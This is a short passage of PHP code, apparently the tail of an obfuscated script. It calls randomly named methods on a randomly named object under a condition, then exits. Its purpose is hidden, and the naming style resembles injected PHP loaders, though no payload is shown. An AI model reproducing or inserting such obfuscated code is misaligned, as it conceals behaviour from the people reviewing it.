($_ad9tbovl->_jvrn6()) {$_ad9tbovl->_huep6();}exit();